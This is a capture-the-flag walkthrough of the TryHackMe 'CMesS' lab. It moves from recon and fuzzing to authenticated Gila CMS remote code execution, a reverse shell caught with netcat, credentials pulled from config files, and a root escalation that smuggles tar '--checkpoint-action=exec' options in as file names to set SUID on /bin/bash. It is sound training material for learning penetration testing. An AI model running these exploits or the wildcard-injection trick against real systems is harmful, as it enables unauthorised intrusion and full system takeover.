
```Bash
sudo nano /etc/hosts

#added
10.49.145.173 cmess.thm
```

## Recon

### Rustscan - Open ports are 22, 80

```Bash
#all ports
rustscan -a 10.49.145.173 -r 1-65535 -- -oN allports.txt

#service scans
rustscan -a 10.49.145.173 -- -sC -sV -oN services.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Directory Bruteforce

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/cmess]
└─$ ffuf -u http://cmess.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200-299,301,302,307 -o ffuf.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Output file      : ffuf.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307
________________________________________________

themes                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 124ms]
sites                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 137ms]
tag                     [Status: 200, Size: 3874, Words: 523, Lines: 110, Duration: 152ms]
feed                    [Status: 200, Size: 735, Words: 37, Lines: 22, Duration: 139ms]
category                [Status: 200, Size: 3862, Words: 522, Lines: 110, Duration: 119ms]
blog                    [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 86ms]
lib                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 145ms]
api                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 108ms]
admin                   [Status: 200, Size: 1580, Words: 377, Lines: 42, Duration: 852ms]
assets                  [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 85ms]
author                  [Status: 200, Size: 3590, Words: 419, Lines: 102, Duration: 122ms]
about                   [Status: 200, Size: 3353, Words: 372, Lines: 93, Duration: 199ms]
tags                    [Status: 200, Size: 3139, Words: 337, Lines: 85, Duration: 725ms]
tmp                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 2911ms]
Search                  [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 112ms]
log                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 126ms]
search                  [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 4988ms]
index                   [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 208ms]
login                   [Status: 200, Size: 1580, Words: 377, Lines: 42, Duration: 5328ms]
1                       [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 186ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 36ms]
fm                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 171ms]
0                       [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 148ms]
About                   [Status: 200, Size: 3339, Words: 372, Lines: 93, Duration: 59ms]
01                      [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 386ms]
Author                  [Status: 200, Size: 3590, Words: 419, Lines: 102, Duration: 137ms]
Category                [Status: 200, Size: 3862, Words: 522, Lines: 110, Duration: 193ms]
Index                   [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 117ms]
Tags                    [Status: 200, Size: 3139, Words: 337, Lines: 85, Duration: 91ms]
001                     [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 93ms]
Feed                    [Status: 200, Size: 735, Words: 37, Lines: 22, Duration: 84ms]
SEARCH                  [Status: 200, Size: 3851, Words: 522, Lines: 108, Duration: 112ms]
1c                      [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 427ms]
1qaz2wsx                [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 606ms]
ABOUT                   [Status: 200, Size: 3339, Words: 372, Lines: 93, Duration: 358ms]
Tag                     [Status: 200, Size: 3874, Words: 523, Lines: 110, Duration: 91ms]
0001                    [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 309ms]
1_files                 [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 333ms]
1ShoppingCart           [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 122ms]
1_css                   [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 125ms]
1dump                   [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 124ms]
1images                 [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 120ms]
1temp                   [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 103ms]
1loginlog               [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 111ms]
1OLD                    [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 134ms]
1-livraison             [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 508ms]
1-delivery              [Status: 200, Size: 4078, Words: 431, Lines: 103, Duration: 526ms]
:: Progress: [29999/29999] :: Job [1/1] :: 10 req/sec :: Duration: [0:12:41] :: Errors: 9 ::

```

### Subdomain BruteForce

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/cmess]
└─$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm/' -H "HOST: FUZZ.cmess.thm" -fw 522 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 522
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 3100ms]
secure                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9492ms]
demo                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9489ms]
mysqladmin              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 289ms]
autodiscover.video      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 159ms]
web06                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 228ms]
pim                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 223ms]
lala                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 209ms]
icm                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 267ms]
autodiscover.crm        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 242ms]
:: Progress: [4989/4989] :: Job [1/1] :: 52 req/sec :: Duration: [0:01:15] :: Errors: 0 ::

```

URL - http://dev.cmess.thm
![[Pasted image 20260119221115.png]]

Found Creds - andre@cmess.thm:KPFTN_f2yxe% 

Now lets try to login to http://cmess.thm/admin

After successful login extract cmess version to find vulnerabilities
![[Pasted image 20260119221245.png]]

### Exploitation of Gila CMS

Gila CMS version - 1.10.9
There is a vulnerability of RCE - https://www.exploit-db.com/exploits/51569

```Bash
searchsploit Gila 
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)                                                                                                   | php/webapps/51569.py
Gila CMS 1.11.8 - 'query' SQL Injection                                                                                                                         | php/webapps/48590.py
Gila CMS 1.9.1 - Cross-Site Scripting                                                                                                                           | php/webapps/46557.txt
Gila CMS 2.0.0 - Remote Code Execution (Unauthenticated)                                                                                                        | php/webapps/49412.py
Gila CMS < 1.11.1 - Local File Inclusion                                                                                                                        | multiple/webapps/47407.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Automated Approach

```Bash
└─$ python3 51569.py           
Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin/
Enter the email: andre@cmess.thm
Enter the password: KPFTN_f2yxe%
Enter the local IP (LHOST): 192.168.159.0
Enter the local port (LPORT): 4444
File uploaded successfully.
Payload executed successfully.

```

Manual Approach

In Gila Admin page navigate to administration->themes->index.php

replaced with pentest monkey rev-shell.php file and setup a listener on kali

```Bash
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.159.0] from (UNKNOWN) [10.49.145.173] 56704
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 08:03:43 up 42 min,  0 users,  load average: 0.00, 0.02, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
#Shell stabilization starts ----------------------------
$ python3 -c 'import sty;sty.spawn("/bin/bash")'
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ImportError: No module named 'sty'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cmess:/$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/tools/Web]
└─$ stty raw -echo ; fg                 
[1]  + continued  nc -lvnp 4444

www-data@cmess:/$ export TERM=xterm
www-data@cmess:/$ ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
```

### Linpeas.sh enumeration

```Bash
#mysql is running high chance to dump creds
mysql process found (dump creds from memory as root)

#cronjob running as root every few mins
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

#total users                                 
╔══════════╣ Users with console
andre:x:1000:1000:andre,,,:/home/andre:/bin/bash                                   root:x:0:0:root:/root:/bin/bash

#password file
/opt/.password.bak
```

### Config.php enumeration

```Bash
www-data@cmess:/var/www/html$ cat config.php
<?php

$GLOBALS['config'] = array (
  'db' => 
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'permissions' => 
  array (
    1 => 
    array (
      0 => 'admin',
      1 => 'admin_user',
      2 => 'admin_userrole',
    ),
  ),
  'packages' => 
  array (
    0 => 'blog',
  ),
  'base' => 'http://cmess.thm/gila/',
  'theme' => 'gila-blog',
  'title' => 'Gila CMS',
  'slogan' => 'An awesome website!',
  'default-controller' => 'blog',
  'timezone' => 'America/Mexico_City',
  'ssl' => '',
  'env' => 'pro',
  'check4updates' => 1,
  'language' => 'en',
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
```

Database creds for root:r0otus3rpassw0rd

Access mysql db
```Bash
www-data@cmess:/var/www/html$ mysql -h 127.0.0.1 -P 3306 -u root -p

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gila               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use gila;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_gila |
+----------------+
| option         |
| page           |
| post           |
| postcategory   |
| postmeta       |
| user           |
| usermeta       |
| userrole       |
| widget         |
+----------------+
9 rows in set (0.00 sec)

mysql> select * FROM user;
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
| id | username | email           | pass                                                         | active | reset_code | created             | updated             |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |            | 2020-02-06 18:20:34 | 2020-02-06 18:20:34 |
+----+----------+-----------------+--------------------------------------------------------------+--------+------------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> exit

```

Unfortunately!! these are of no use.

```Bash
www-data@cmess:/var/www/html$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

obtained creds for andre:UQfsdCB7aAP6

Lets SSH as andre and obtained User.txt

```Bash
andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ cat user.txt 
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

### PrivEsc

Since a cronjob is running as root every few mins lets exploit that to give us access to priv shell.

```Bash
#create shell.sh
andre@cmess:~/backup$ echo 'chmod u+s /bin/bash' > shell.sh
andre@cmess:~/backup$ chmod +x shell.sh 
andre@cmess:~/backup$ ls
note  shell.sh
andre@cmess:~/backup$ touch ./--checkpoint=1
andre@cmess:~/backup$ touch './--checkpoint-action=exec=sh shell.sh'
andre@cmess:~/backup$ ls
--checkpoint=1  --checkpoint-action=exec=sh shell.sh  note  shell.sh

```

### Explanation

What those files do
With this cron:


```Bash
*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

The `*` expands to every filename in `/home/andre/backup`.  
If the directory contains:

- `note`
    
- `shell.sh`
    
- `--checkpoint=1`
    
- `--checkpoint-action=exec=sh shell.sh`
    
then the expanded command becomes roughly:


```Bash
tar -zcf /tmp/andre_backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh note shell.sh
```

Tar understands:

- `--checkpoint=1` → run an action every 1 record.
    
- `--checkpoint-action=exec=sh shell.sh` → when checkpoint hits, execute `sh shell.sh`.
    

Since cron runs as **root**, tar runs as root, so `sh shell.sh` is executed as root. If `shell.sh` contains:

```Bash
chmod u+s /bin/bash
```

it sets the SUID bit on `/bin/bash`, giving you a root shell via `bash -p`.​

### Root Shell

```Bash
andre@cmess:~/backup$ ls -l /tmp/andre_backup.tar.gz
-rw-r--r-- 1 root root 216 Jan 19 08:34 /tmp/andre_backup.tar.gz
andre@cmess:~/backup$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash
andre@cmess:~/backup$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt 
thm{9f85b7fdeb2cf96985bf5761a93546a2}
bash-4.3# exit
```

